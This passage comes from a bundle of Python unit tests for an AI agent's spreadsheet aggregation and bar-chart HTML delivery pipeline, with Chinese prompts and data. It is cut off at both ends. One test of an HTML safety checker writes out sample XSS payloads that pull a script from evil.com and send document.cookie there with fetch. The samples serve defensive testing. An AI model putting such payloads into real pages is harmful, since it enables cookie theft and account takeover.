def test_skill_stage_cannot_rewrite_the_user_output_contract(self):\n        intent = {\'task_mode\': \'execute\', \'output_mode\': \'conversation\', \'artifact_types\': [], \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n                  \'requirements\': [{\'id\': \'goal\', \'quote\': self.request}], \'question\': \'\'}\n        decision = {k: v for k, v in self.decision().items() if k not in intent}\n        decision[\'output_mode\'] = \'artifact\'\n        from types import SimpleNamespace\n        with patch(\'dsh_modules.skill_admission.extract_task_intent\', return_value=intent), \\\n             patch(\'dsh_modules.skill_admission.structured_decision\', return_value=decision), redirect_stdout(io.StringIO()):\n            with self.assertRaises(ValueError):\n                admit_skill(self.request, [], [], SimpleNamespace(skill_id=\'alpha-policy\'), \'model\', None,\n                    self.telemetry, time.monotonic()+30, available_skills=self.skills, read_body=lambda _: \'实际技能正文\')\n\n    def test_admission_failure_falls_back_with_locked_goal_and_no_stale_skill_flags(self):\n        from dsh_modules.skill_admission import general_route\n        intent = {\'task_mode\': \'execute\', \'output_mode\': \'conversation\', \'artifact_types\': [], \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n                  \'requirements\': [{\'id\': \'r\', \'quote\': self.request}]}\n        with redirect_stdout(io.StringIO()):\n            route = general_route(self.request, [], [\'source.xlsx\'], intent)\n        self.assertIsNone(route.skill_id)\n        self.assertFalse(route.is_generate_intent)\n        self.assertFalse(route.requires_execution)\n        self.assertEqual(route.admission[\'requirements\'], intent[\'requirements\'])\n        self.assertTrue(requires_spreadsheet_analysis(self.request, route))\n\n\n    def test_nonempty_question_is_rechecked_instead_of_silently_discarded(self):\n        def responder(p, n):\n            res = self.decision(action=\'use\', skill=\'alpha-policy\', defaults=False)\n            res[\'question\'] = \'是否需要生成柱状图？\'\n            return res\n        with self.assertRaisesRegex(AdmissionClarification, \'是否需要生成柱状图\'):\n            self.invoke(responder)\n\n    def test_admission_normalizes_leftover_skill_fields_when_action_is_general(self):\n        # 验证当模型设置 action=\'general\' 但未清除 skill_id 或 use_default_rules 时自动对齐\n        def responder(p, n):\n            res = self.decision(action=\'general\', skill=\'alpha-policy\', defaults=True)\n            res[\'question\'] = \'\'\n            return res\n        route, _, calls = self.invoke(responder)\n        self.assertEqual(len(calls), 1)\n        self.assertIsNone(route.skill_id)\n        self.assertFalse(route.admission[\'use_default_rules\'])\n        self.assertEqual(route.admission[\'question\'], \'\')\n\n\nif __name__ == \'__main__\': unittest.main()\n', 'test_spreadsheet_chart_delivery.py': '"""Delivery regressions: stale HTML, real SVG/data acceptance, bounded repair and loop continuation."""\nimport io\nimport json\nimport os\nfrom pathlib import Path\nimport tempfile\nimport unittest\nfrom unittest.mock import patch\nfrom contextlib import redirect_stdout\nfrom xml.etree import ElementTree as ET\n\nimport openpyxl\n\nfrom dsh_modules.spreadsheet_analysis import calculate_spreadsheet_analysis\nfrom dsh_modules.spreadsheet_chart_delivery import SpreadsheetChartDelivery, chart_dataset, wants_standard_bar_chart\nfrom dsh_modules.spreadsheet_chart_renderer import render_bar_chart, validate_bar_chart\nfrom dsh_modules.telemetry import TelemetryStats\nfrom dsh_modules.tool_result import ToolResult\n\n\nclass SpreadsheetChartDeliveryTests(unittest.TestCase):\n    def setUp(self):\n        self.tmp = tempfile.TemporaryDirectory()\n        self.addCleanup(self.tmp.cleanup)\n        self.root = Path(self.tmp.name)\n        self.source = self.root / \'source.xlsx\'\n        wb = openpyxl.Workbook()\n        ws = wb.active\n        ws.title = \'明细\'\n        ws.append([\'部门名称\', \'WBS编号\', \'金额(K)\'])\n        for row in [(\'甲<&\', \'IK01\', 20), (\'甲<&\', \'IK02\', -5), (\'乙\', \'EX01\', 100),\n                    (\'乙\', \'IK03\', -3), (\'丙\', \'IK04\', 0)]:\n            ws.append(row)\n        wb.save(self.source)\n        wb.close()\n        self.prompt = \'按部门统计金额合计，不包含WBS编号ex开头的数据，然后生成柱状图\'\n        self.receipt = calculate_spreadsheet_analysis(self.source, {\'query\': {\n            \'source\': {\'sheet\': \'明细\', \'header_row\': 1, \'data_range\': \'A2:C6\'},\n            \'where\': {\'field\': \'WBS编号\', \'op\': \'not_starts_with\', \'values\': [\'ex\']},\n            \'group_by\': [\'部门名称\'],\n            \'metrics\': [{\'id\': \'amount\', \'op\': \'sum\', \'field\': \'金额(K)\'}]}})\n        self.assertTrue(self.receipt.is_success, self.receipt.error)\n        # Engine-only calculation has no model origin, but retains source hash/path.\n        self.receipt.provenance[\'file_path\'] = str(self.source)\n\n    def test_stale_shared_html_never_used_or_overwritten_and_turns_are_unique(self):\n        stale = self.root / \'index.html\'\n        stale.write_text(\'<html><body>old chart: 15</body></html>\')\n        os.utime(stale, (1, 1))\n        paths = []\n        for sid in [\'same-session\', \'same-session\', \'another-session\']:\n            delivery = SpreadsheetChartDelivery(self.root, sid)\n            self.assertTrue(delivery.publish(self.receipt, self.prompt, TelemetryStats()), delivery.error)\n            manifest = json.loads((delivery.run_dir / \'manifest.json\').read_text())\n            self.assertEqual(manifest[\'transitions\'],\n                             [\'calculating\', \'calculated\', \'generating\', \'validating\', \'validated\', \'published\'])\n            self.assertTrue((delivery.run_dir / \'inputs/verified-data.json\').exists())\n            self.assertTrue((delivery.run_dir / \'outputs/index.html\').exists())\n            validate_bar_chart(delivery.published.read_text(), delivery.dataset)\n            self.assertIn(\'甲&lt;&amp;\', delivery.published.read_text())\n            self.assertEqual([p[\'value\'] for p in delivery.dataset[\'points\']], [\'15\', \'-3\', \'0\'])\n            self.assertIn(\'下载柱状图\', delivery.presentation())\n            paths.append(delivery.published)\n        self.assertEqual(len(set(paths)), 3)\n        self.assertEqual(stale.read_text(), \'<html><body>old chart: 15</body></html>\')\n\n    def test_table_only_or_tampered_chart_cannot_pass_acceptance(self):\n        dataset = chart_dataset(self.receipt, self.prompt)\n        html = render_bar_chart(dataset)\n        mutations = [html.replace(\'<rect \', \'<not-a-bar \'),\n                     html.replace(\'height="250.\', \'height="999.\'),\n                     html.replace(\'data-value="15"\', \'data-value="999"\'),\n                     html.replace(\'<td>15</td>\', \'<td>999</td>\')]\n        # Explicit geometry mutation independent of scale rounding.\n        import re\n        mutations[1] = re.sub(r\'height="[0-9.]+" fill=\', \'height="999" fill=\', html, count=1)\n        for changed in mutations:\n            with self.subTest():\n                with self.assertRaises((ValueError, ET.ParseError)):\n                    validate_bar_chart(changed, dataset)\n        with self.assertRaises(ValueError):\n            validate_bar_chart(\'<html><body><table/></body></html>\', dataset)\n\n    def test_retry_does_not_repeat_calculation_and_failure_does_not_publish(self):\n        delivery = SpreadsheetChartDelivery(self.root, \'retry\')\n        real = render_bar_chart\n        with patch(\'dsh_modules.spreadsheet_chart_delivery.render_bar_chart\',\n                   side_effect=[ValueError(\'temporary_render_error\'), real(chart_dataset(self.receipt, self.prompt))]) as render:\n            self.assertTrue(delivery.publish(self.receipt, self.prompt, TelemetryStats()), delivery.error)\n            self.assertEqual(render.call_count, 2)\n        failed = SpreadsheetChartDelivery(self.root, \'failed\')\n        with patch(\'dsh_modules.spreadsheet_chart_delivery.validate_bar_chart\', side_effect=ValueError(\'bad_geometry\')) as accept:\n            self.assertFalse(failed.publish(self.receipt, self.prompt, TelemetryStats()))\n            self.assertEqual(accept.call_count, 2)\n        self.assertEqual(failed.outbound(), [])\n        self.assertEqual(list(self.root.glob(\'chart-failed-*.html\')), [])\n        self.assertNotIn(\'已生成\', failed.presentation())\n        self.assertEqual(failed.state[\'status\'], \'failed\')\n\n    def test_source_change_and_publish_tamper_fail_closed(self):\n        delivery = SpreadsheetChartDelivery(self.root, \'source-change\')\n        self.source.write_bytes(b\'changed\')\n        self.assertFalse(delivery.publish(self.receipt, self.prompt, TelemetryStats()))\n        self.assertEqual(delivery.outbound(), [])\n\n    def test_incomplete_evidence_is_not_chart_ready_even_if_clarification_can_finish(self):\n        from dsh_modules.spreadsheet_chart_delivery import verified_chart_receipt\n        with patch(\'dsh_modules.analysis_task_state.analysis_task_state\', return_value={\n                \'complete\': False, \'gate_review\': {\'action\': \'clarify\'}}):\n            self.assertIsNone(verified_chart_receipt([self.receipt], self.prompt))\n\n    def test_old_index_does_not_satisfy_legacy_completion_evaluator(self):\n        from dsh_modules.completion_evaluator import evaluate_tool_execution_turn\n        stale = self.root / \'index.html\'\n        stale.write_text(render_bar_chart(chart_dataset(self.receipt, self.prompt)))\n        os.utime(stale, (1, 1))\n        import time\n        turn = type(\'Turn\', (), {\'may_finish\': lambda *a, **k: True})()\n        with patch(\'dsh_modules.completion_evaluator.detect_missing_requested_deliverable\', return_value=\'.html\'):\n            finish, transition, _ = evaluate_tool_execution_turn(\n                turn, [self.receipt], [], None, None, True, [], \'\', 0, 2, 10,\n                last_user_prompt=self.prompt, expected_deliverables=[\'.html\'],\n                start_ts=time.time(), workspace_dir=str(self.root))\n        self.assertFalse(finish)\n        self.assertIn(\'交付阶段\', transition)\n\n    def test_loop_repairs_query_then_renders_without_model_html_or_shared_scan(self):\n        from dsh_modules import agent_loop\n        from dsh_modules.runtime_policy import RuntimePolicy\n        from dsh_modules.tools import get_sandbox_tools\n        replies = [{\'content\': \'\', \'tool_calls\': [{\'id\': str(i), \'type\': \'function\', \'function\': {\n                    \'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]} for i in range(2)]\n        counter = []\n        def dispatch(*args, **kwargs):\n            receipt = (ToolResult.error(\'invalid_analysis_plan\', \'query must be object\',\n                       provenance={\'tool\': \'aggregate_spreadsheet\'}) if not counter else self.receipt)\n            kwargs[\'execution_evidence\'].append(receipt)\n            counter.append(receipt)\n            return False\n        def may_finish(_, evidence, **kwargs):\n            return bool(evidence and evidence[-1].is_success)\n        with patch.object(agent_loop, \'WORKSPACE_DIR\', str(self.root)), \\\n             patch.object(agent_loop, \'call_model_proxy\', side_effect=replies) as model, \\\n             patch.object(agent_loop, \'_dispatch_tool_calls\', side_effect=dispatch), \\\n             patch(\'dsh_modules.analysis_task_state.analysis_task_state\', side_effect=lambda evidence, *a, **k: {\'complete\': may_finish(None, evidence), \'evidence_ids\': [self.receipt.data[\'evidence_id\']]}), \\\n             patch.object(agent_loop, \'evaluate_tool_execution_turn\', return_value=(False, None, 3)), \\\n             patch.object(agent_loop, \'_finalize_agent_text\', side_effect=AssertionError(\'no free-text finalizer\')), \\\n             redirect_stdout(io.StringIO()):\n            result = agent_loop.run_agent_loop([{\'role\': \'system\', \'content\': \'\'}, {\'role\': \'user\', \'content\': self.prompt}],\n                       model=\'test\', policy=RuntimePolicy(), max_rounds=3, tools=get_sandbox_tools(),\n                       spreadsheet_analysis_required=True, is_generate_intent=True,\n                       user_prompt=self.prompt, delivery_session_id=\'loop-test\')\n        self.assertEqual(model.call_count, 2)\n        self.assertEqual(len(result.outbound_files), 1)\n        self.assertIn(\'柱状图已生成\', result.final_text)\n        self.assertFalse((self.root / \'index.html\').exists())\n        for call in model.call_args_list:\n            self.assertNotIn(\'bash\', {t[\'function\'][\'name\'] for t in call.kwargs[\'tools\']})\n\n    def test_failed_delivery_cannot_be_recovered_as_success_by_outer_exporter(self):\n        from dsh_modules.artifact_exporter import ArtifactExporter\n        from dsh_modules.html_report_fallback import materialize_requested_html\n        warning = \'> ⚠️ **【重要提示：目标交付物尚未生成落盘】**\\n\\n\' + \'|部门|金额|\\n|---|---|\\n|甲|15|\\n\' * 10\n        (self.root / \'index.html\').write_text(render_bar_chart(chart_dataset(self.receipt, self.prompt)))\n        self.assertEqual(ArtifactExporter.export_html(warning, False, str(self.root), prompt=self.prompt), (warning, []))\n        self.assertEqual(materialize_requested_html(self.prompt, warning, str(self.root), is_design_intent=True), (None, False))\n\n    def test_route_does_not_capture_excel_or_negated_chart_requests(self):\n        self.assertTrue(wants_standard_bar_chart(self.prompt))\n        self.assertFalse(wants_standard_bar_chart(\'按部门统计金额，不要生成柱状图\'))\n        self.assertFalse(wants_standard_bar_chart(\'生成Excel柱状图\'))\n        self.assertTrue(wants_standard_bar_chart(\'根据 source.xlsx 统计金额，然后生成柱状图\'))\n        self.assertTrue(wants_standard_bar_chart(\'使用Excel数据按部门统计金额，然后生成柱状图\'))\n\n    def test_sole_spreadsheet_attachment_inferred_when_filepath_empty(self):\n        from dsh_modules.spreadsheet_context import resolve_session_attachment\n        with patch.dict(os.environ, {"DSH_SESSION_ATTACHMENTS": self.source.name}):\n            with patch(\'dsh_modules.config.WORKSPACE_DIR\', str(self.root)):\n                res, err = resolve_session_attachment("", "测试")\n                self.assertIsNone(err)\n                self.assertEqual(res, self.source.resolve())\n\n    def test_multiple_attachments_require_explicit_filepath(self):\n        from dsh_modules.spreadsheet_context import resolve_session_attachment\n        other = self.root / \'other.xlsx\'\n        other.write_text(\'dummy\')\n        with patch.dict(os.environ, {"DSH_SESSION_ATTACHMENTS": f"{self.source.name},{other.name}"}):\n            with patch(\'dsh_modules.config.WORKSPACE_DIR\', str(self.root)):\n                res, err = resolve_session_attachment("", "测试")\n                self.assertIsNone(res)\n                self.assertTrue(err.is_error)\n                self.assertEqual(err.error_code, "source_unavailable")\n                self.assertIn("当前可用附件", err.error_message)\n\n    def test_cross_check_with_scripts_matching_and_mismatch(self):\n        from dsh_modules.spreadsheet_chart_workflow import cross_check_with_scripts\n        dataset = {\n            \'points\': [\n                {\'label\': \'華東MIS\', \'value\': \'561.75345\'},\n                {\'label\': \'華東BAS\', \'value\': \'260.64793\'}\n            ]\n        }\n        bash_stdout = (\n            "=== 按部门统计的金额合计 ===\\n"\n            "   華東MIS 561.75345   91\\n"\n            "   華東BAS 260.64793   40\\n"\n        )\n        ev_match = [ToolResult.success(bash_stdout, provenance={\'tool\': \'bash\'})]\n        res = cross_check_with_scripts(dataset, ev_match)\n        self.assertEqual(res[\'status\'], \'match\')\n        self.assertEqual(res[\'found\'], 2)\n        self.assertEqual(res[\'mismatched\'], [])\n\n        bash_stdout_mismatch = (\n            "=== 按部门统计的金额合计 ===\\n"\n            "   華東MIS 561.75345   91\\n"\n            "   華東BAS 999.00000   40\\n"\n        )\n        ev_mismatch = [ToolResult.success(bash_stdout_mismatch, provenance={\'tool\': \'bash\'})]\n        res = cross_check_with_scripts(dataset, ev_mismatch)\n        self.assertEqual(res[\'status\'], \'mismatch\')\n        self.assertEqual(res[\'mismatched\'], [\'華東BAS\'])\n\n    def test_failure_presentation_includes_reasons_and_preserves_reply_without_html(self):\n        from dsh_modules.spreadsheet_chart_workflow import failure_presentation\n        delivery = SpreadsheetChartDelivery(self.root, \'failure-test\')\n        delivery.fail(\'verified_chart_data_unavailable_within_budget\', TelemetryStats())\n        ev = [\n            ToolResult.error(\'source_unavailable\', \'未指定有效文件路径\', provenance={\'tool\': \'aggregate_spreadsheet\'}),\n            ToolResult.success("数据统计完成，华东MIS为561.75", provenance={\'tool\': \'bash\'})\n        ]\n        reply_with_html = "建议核实参数。\\n```html\\n<!DOCTYPE html><html><body>图表</body></html>\\n```\\n祝工作顺利！"\n        output = failure_presentation(delivery, ev, reply_with_html)\n        self.assertIn("柱状图尚未完成交付", output)\n        self.assertIn("原因：", output)\n        self.assertIn("缺少或写错了文件路径参数", output)\n        self.assertIn("脚本产物不经运行时核验", output)\n        self.assertIn("模型说明：", output)\n        self.assertIn("建议核实参数", output)\n        self.assertNotIn("<!DOCTYPE html>", output)\n        self.assertNotIn("```html", output)\n        self.assertIn("建议：", output)\n\n    def test_chart_mode_prevents_bash_fallback_on_consecutive_errors(self):\n        from dsh_modules import agent_loop\n        from dsh_modules.runtime_policy import RuntimePolicy\n        from dsh_modules.tools import get_sandbox_tools\n        replies = [\n            {\'content\': \'\', \'tool_calls\': [{\'id\': \'call_1\', \'type\': \'function\', \'function\': {\n                \'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]},\n            {\'content\': \'\', \'tool_calls\': [{\'id\': \'call_2\', \'type\': \'function\', \'function\': {\n                \'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]},\n            {\'content\': \'\', \'tool_calls\': [{\'id\': \'call_3\', \'type\': \'function\', \'function\': {\n                \'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]},\n            # 循环耗尽后 salvage 阶段的回复（放弃或继续失败）\n            {\'content\': \'未能完成核算\', \'tool_calls\': []},\n            {\'content\': \'未能完成核算\', \'tool_calls\': []},\n        ]\n        def dispatch(*args, **kwargs):\n            receipt = ToolResult.error(\'source_unavailable\', \'未指定有效文件路径\', provenance={\'tool\': \'aggregate_spreadsheet\'})\n            kwargs[\'execution_evidence\'].append(receipt)\n            return False\n\n        with patch.object(agent_loop, \'WORKSPACE_DIR\', str(self.root)), \\\n             patch.object(agent_loop, \'MAX_AGENT_ROUNDS_HARD_CEILING\', 3), \\\n             patch.object(agent_loop, \'MAX_SPREADSHEET_ROUNDS_CEILING\', 3), \\\n             patch.object(agent_loop, \'call_model_proxy\', side_effect=replies) as mock_model, \\\n             patch.object(agent_loop, \'_dispatch_tool_calls\', side_effect=dispatch), \\\n             patch(\'dsh_modules.analysis_task_state.analysis_task_state\', return_value={\'complete\': False}), \\\n             patch.object(agent_loop, \'evaluate_tool_execution_turn\', return_value=(False, None, 3)), \\\n             redirect_stdout(io.StringIO()):\n            result = agent_loop.run_agent_loop(\n                [{\'role\': \'system\', \'content\': \'\'}, {\'role\': \'user\', \'content\': self.prompt}],\n                model=\'test\', policy=RuntimePolicy(), max_rounds=3, tools=get_sandbox_tools(),\n                spreadsheet_analysis_required=True, is_generate_intent=True,\n                user_prompt=self.prompt, delivery_session_id=\'chart-no-bash-test\'\n            )\n        for call in mock_model.call_args_list:\n            tools_in_call = {t[\'function\'][\'name\'] for t in call.kwargs[\'tools\']}\n            self.assertNotIn(\'bash\', tools_in_call)\n        self.assertIn("柱状图尚未完成交付", result.final_text)\n        self.assertIn("原因：", result.final_text)\n\n    def test_salvage_chart_delivery_rescues_unverified_loop(self):\n        from dsh_modules import agent_loop\n        from dsh_modules.runtime_policy import RuntimePolicy\n        from dsh_modules.tools import get_sandbox_tools\n        # 前两轮模型因错误未产出 verified receipt；在第二轮后进入 salvage，模型输出有效 aggregate 调用\n        loop_replies = [\n            {\'content\': \'\', \'tool_calls\': [{\'id\': \'c1\', \'type\': \'function\', \'function\': {\n                \'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]},\n            {\'content\': \'\', \'tool_calls\': [{\'id\': \'c2\', \'type\': \'function\', \'function\': {\n                \'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]},\n        ]\n        salvage_reply = {\n            \'content\': \'\', \'tool_calls\': [{\'id\': \'salvage_1\', \'type\': \'function\', \'function\': {\n                \'name\': \'aggregate_spreadsheet\', \'arguments\': \'{"file_path":"/workspace/source.xlsx"}\'}}]}\n        all_replies = loop_replies + [salvage_reply]\n\n        def dispatch(*args, **kwargs):\n            calls = kwargs.get(\'structured_calls\', [])\n            for c in calls:\n                if c.get(\'id\') == \'salvage_1\':\n                    kwargs[\'execution_evidence\'].append(self.receipt)\n                else:\n                    kwargs[\'execution_evidence\'].append(\n                        ToolResult.error(\'source_unavailable\', \'未指定有效文件路径\', provenance={\'tool\': \'aggregate_spreadsheet\'}))\n            return False\n\n        def mock_analysis_state(evidence, *a, **k):\n            has_success = any(getattr(e, \'is_success\', False) for e in evidence)\n            return {\'complete\': has_success, \'evidence_ids\': [self.receipt.data[\'evidence_id\']] if has_success else []}\n\n        with patch.object(agent_loop, \'WORKSPACE_DIR\', str(self.root)), \\\n             patch.object(agent_loop, \'MAX_AGENT_ROUNDS_HARD_CEILING\', 2), \\\n             patch.object(agent_loop, \'MAX_SPREADSHEET_ROUNDS_CEILING\', 2), \\\n             patch.object(agent_loop, \'call_model_proxy\', side_effect=all_replies) as mock_model, \\\n             patch.object(agent_loop, \'_dispatch_tool_calls\', side_effect=dispatch), \\\n             patch(\'dsh_modules.analysis_task_state.analysis_task_state\', side_effect=mock_analysis_state), \\\n             patch.object(agent_loop, \'evaluate_tool_execution_turn\', return_value=(False, None, 2)), \\\n             redirect_stdout(io.StringIO()):\n            result = agent_loop.run_agent_loop(\n                [{\'role\': \'system\', \'content\': \'\'}, {\'role\': \'user\', \'content\': self.prompt}],\n                model=\'test\', policy=RuntimePolicy(), max_rounds=2, tools=get_sandbox_tools(),\n                spreadsheet_analysis_required=True, is_generate_intent=True,\n                user_prompt=self.prompt, delivery_session_id=\'salvage-test\'\n            )\n        self.assertIn("柱状图已生成", result.final_text)\n        self.assertEqual(len(result.outbound_files), 1)\n        purposes = [c.kwargs.get(\'purpose\') for c in mock_model.call_args_list]\n        self.assertIn(\'chart_salvage\', purposes)\n\n    def test_is_safe_unverified_html_rejects_xss_and_external_resources(self):\n        from dsh_modules.spreadsheet_chart_workflow import is_safe_unverified_html\n        safe_file = self.root / \'safe.html\'\n        safe_file.write_text(\'<html><head><style>h1{color:blue}</style></head><body><h1>柱状图</h1><svg><rect width="10" height="20"/></svg></body></html>\')\n        self.assertTrue(is_safe_unverified_html(safe_file))\n\n        # 带有外部 script 的\n        unsafe_1 = self.root / \'unsafe_1.html\'\n        unsafe_1.write_text(\'<html><head><script src="https://evil.com/xss.js"></script></head><body></body></html>\')\n        self.assertFalse(is_safe_unverified_html(unsafe_1))\n\n        # 带有 onclick 事件的\n        unsafe_2 = self.root / \'unsafe_2.html\'\n        unsafe_2.write_text(\'<html><body><div onclick="doEvil()">点击</div></body></html>\')\n        self.assertFalse(is_safe_unverified_html(unsafe_2))\n\n        # 带有 iframe 的\n        unsafe_3 = self.root / \'unsafe_3.html\'\n        unsafe_3.write_text(\'<html><body><iframe src="http://evil.com"></iframe></body></html>\')\n        self.assertFalse(is_safe_unverified_html(unsafe_3))\n\n        # 带有高危 JS API 的\n        unsafe_4 = self.root / \'unsafe_4.html\'\n        unsafe_4.write_text(\'<html><body><script>fetch("http://evil.com?c=" + document.cookie)</script></body></html>\')\n        self.assertFalse(is_safe_unverified_html(unsafe_4))\n\n    def test_p2_unverified_fallback_disabled_by_default(self):\n        from dsh_modules import agent_loop\n        from dsh_modules.runtime_policy import RuntimePolicy\n        from dsh_modules.tools import get_sandbox_tools\n        # 工作区有一个本轮生成的有效 HTML 柱状图\n        bash_html = self.root / \'部门金额柱状图.html\'\n        bash_html.write_text(\'<html><body><h1>部门金额柱状图</h1><svg><rect width="100" height="50"/></svg></body></html>\')\n\n        replies = [\n            {\'content\': \'\', \'tool_calls\': [{\'id\': \'c1\', \'type\': \'function\', \'function\': {\'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]},\n            {\'content\': \'未能完成核算\', \'tool_calls\': []},\n            {\'content\': \'未能完成核算\', \'tool_calls\': []},\n        ]\n        def dispatch(*args, **kwargs):\n            kwargs[\'execution_evidence\'].append(\n                ToolResult.error(\'source_unavailable\', \'未指定有效文件路径\', provenance={\'tool\': \'aggregate_spreadsheet\'}))\n            return False\n\n        policy = RuntimePolicy()\n        self.assertFalse(policy.allow_unverified_chart_fallback)\n\n        with patch.object(agent_loop, \'WORKSPACE_DIR\', str(self.root)), \\\n             patch.object(agent_loop, \'MAX_AGENT_ROUNDS_HARD_CEILING\', 1), \\\n             patch.object(agent_loop, \'MAX_SPREADSHEET_ROUNDS_CEILING\', 1), \\\n             patch.object(agent_loop, \'call_model_proxy\', side_effect=replies), \\\n             patch.object(agent_loop, \'_dispatch_tool_calls\', side_effect=dispatch), \\\n             patch(\'dsh_modules.analysis_task_state.analysis_task_state\', return_value={\'complete\': False}), \\\n             patch.object(agent_loop, \'evaluate_tool_execution_turn\', return_value=(False, None, 1)), \\\n             redirect_stdout(io.StringIO()):\n            result = agent_loop.run_agent_loop(\n                [{\'role\': \'system\', \'content\': \'\'}, {\'role\': \'user\', \'content\': self.prompt}],\n                model=\'test\', policy=policy, max_rounds=1, tools=get_sandbox_tools(),\n                spreadsheet_analysis_required=True, is_generate_intent=True,\n                user_prompt=self.prompt, delivery_session_id=\'p2-default-disabled-test\'\n            )\n        # 默认关闭：不导出未核验产物\n        self.assertEqual(result.outbound_files, [])\n        self.assertNotIn(\'未核验图表文件已降级交付\', result.final_text)\n\n    def test_p2_unverified_fallback_when_enabled_materializes_downloadable_file(self):\n        from dsh_modules import agent_loop\n        from dsh_modules.runtime_policy import RuntimePolicy\n        from dsh_modules.tools import get_sandbox_tools\n        # 工作区有一个本轮生成的安全 HTML 柱状图\n        bash_html = self.root / \'部门金额柱状图.html\'\n        bash_html.write_text(\'<html><body><h1>部门金额柱状图</h1><svg><rect width="100" height="50"/></svg></body></html>\')\n\n        replies = [\n            {\'content\': \'\', \'tool_calls\': [{\'id\': \'c1\', \'type\': \'function\', \'function\': {\'name\': \'aggregate_spreadsheet\', \'arguments\': \'{}\'}}]},\n            {\'content\': \'未能完成核算\', \'tool_calls\': []},\n            {\'content\': \'未能完成核算\', \'tool_calls\': []},\n        ]\n        def dispatch(*args, **kwargs):\n            kwargs[\'execution_evidence\'].append(\n                ToolResult.error(\'source_unavailable\', \'未指定有效文件路径\', provenance={\'tool\': \'aggregate_spreadsheet\'}))\n            return False\n\n        policy = RuntimePolicy()\n        policy.allow_unverified_chart_fallback = True\n\n        with patch.object(agent_loop, \'WORKSPACE_DIR\', str(self.root)), \\\n             patch.object(agent_loop, \'MAX_AGENT_ROUNDS_HARD_CEILING\', 1), \\\n             patch.object(agent_loop, \'MAX_SPREADSHEET_ROUNDS_CEILING\', 1), \\\n             patch.object(agent_loop, \'call_model_proxy\', side_effect=replies), \\\n             patch.object(agent_loop, \'_dispatch_tool_calls\', side_effect=dispatch), \\\n             patch(\'dsh_modules.analysis_task_state.analysis_task_state\', return_value={\'complete\': False}), \\\n             patch.object(agent_loop, \'evaluate_tool_execution_turn\', return_value=(False, None, 1)), \\\n             redirect_stdout(io.StringIO()):\n            result = agent_loop.run_agent_loop(\n                [{\'role\': \'system\', \'content\': \'\'}, {\'role\': \'user\', \'content\': self.prompt}],\n                model=\'test\', policy=policy, max_rounds=1, tools=get_sandbox_tools(),\n                spreadsheet_analysis_required=True, is_generate_intent=True,\n                user_prompt=self.prompt, delivery_session_id=\'p2-enabled-test\'\n            )\n        # 开启后：成功导出未核验产物\n        self.assertEqual(len(result.outbound_files), 1)\n        out_info = json.loads(result.outbound_files[0])\n        self.assertTrue(out_info.get(\'unverified\'))\n        self.assertIn(\'unverified-chart-p2-enabled-test\', out_info.get(\'fileName\'))\n        self.assertTrue(Path(out_info[\'filePath\']).exists())\n        # 正文中带下载链接与明确警示\n        self.assertIn(\'未核验图表文件已降级交付\', result.final_text)\n        self.assertIn(\'下载未核验图表\', result.final_text)\n        self.assertNotIn(\'```html\', result.final_text)\n\n\nif __name__ == \'__main__\':\n    unittest.main()\n', 'test_chart_metric_selection.py': '"""User metric selection must not inherit metric names from attachment metadata."""\nimport hashlib\nimport json\nfrom pathlib import Path\nfrom types import SimpleNamespace\nimport tempfile\nimport unittest\n\nfrom dsh_modules.spreadsheet_chart_delivery import SpreadsheetChartDelivery, chart_dataset\nfrom dsh_modules.telemetry import TelemetryStats\n\n\ndef receipt(source):\n    return SimpleNamespace(data={\n        \'evidence_id\': \'verified\',\n        \'plan\': {\'group_by\': [\'部门名称\'], \'metrics\': [\n            {\'id\': \'amount\', \'op\': \'sum\', \'field\': \'金额(K)\'},\n            {\'id\': \'hours\', \'op\': \'sum\', \'field\': \'工数(小时)\'}],\n            \'source\': {\'sheet\': \'明细\', \'data_range\': \'A2:C4\'},\n            \'where\': {\'field\': \'有偿无偿\', \'op\': \'eq\', \'value\': \'有偿\'}},\n        \'facts\': [{\'id\': \'amount__a\', \'field\': \'金额(K)\', \'unit\': \'K\'},\n                  {\'id\': \'hours__a\', \'field\': \'工数(小时)\', \'unit\': \'小时\'}],\n        \'rows\': [{\'部门名称\': \'甲\', \'amount\': \'15\', \'hours\': \'60\'},\n                 {\'部门名称\': \'乙\', \'amount\': \'-3\', \'hours\': \'20\'},\n                 {\'部门名称\': \'丙\', \'amount\': \'0\', \'hours\': \'10\'}],\n    }, provenance={\'file_path\': str(source),\n                   \'workbook_id\': hashlib.sha256(source.read_bytes()).hexdigest()})\n\n\nclass ChartMetricSelectionTests(unittest.TestCase):\n    def test_attachment_metadata_and_explicit_source_name_do_not_select_hours(self):\n        with tempfile.TemporaryDirectory() as folder:\n            source = Path(folder) / \'工数实绩明细_20261020134124.xlsx\'\n            source.write_bytes(b\'unchanged source\')\n            evidence = receipt(source)\n            command = \'统计各个部门的 有偿 金额的合计，生成一页的柱状图的html\'\n            prompts = [\n                f\'【当前会话有效附件清单】: {source.name}\\n用户指令：{command}\',\n                f\'【当前轮次用户上传附件】: {source.name}\\n用户指令：{command}\',\n                f\'【当前上下文聚焦文档】: {source.name}\\n用户指令：{command}\',\n                f\'根据 {source.name}，{command}\',\n                f\'根据 {source}，{command}\',\n            ]\n            for prompt in prompts:\n                with self.subTest(prompt=prompt):\n                    delivery = SpreadsheetChartDelivery(folder, \'selection\')\n                    self.assertTrue(delivery.publish(evidence, prompt, TelemetryStats()), delivery.error)\n                    self.assertEqual(delivery.dataset[\'value_field\'], \'amount\')\n                    self.assertEqual([p[\'value\'] for p in delivery.dataset[\'points\']], [\'15\', \'-3\', \'0\'])\n                    self.assertEqual(delivery.dataset[\'where\'], evidence.data[\'plan\'][\'where\'])\n                    self.assertEqual(json.loads((delivery.run_dir/\'manifest.json\').read_text())[\'status\'], \'published\')\n\n    def test_explicit_hours_and_real_ambiguity_still_respect_user_choice(self):\n        with tempfile.TemporaryDirectory() as folder:\n            source = Path(folder) / \'金额明细.xlsx\'\n            source.write_bytes(b\'source\')\n            evidence = receipt(source)\n            dataset = chart_dataset(evidence, f\'【当前会话有效附件清单】: {source.name}\\n用户指令：按部门统计工数合计并生成柱状图\')\n            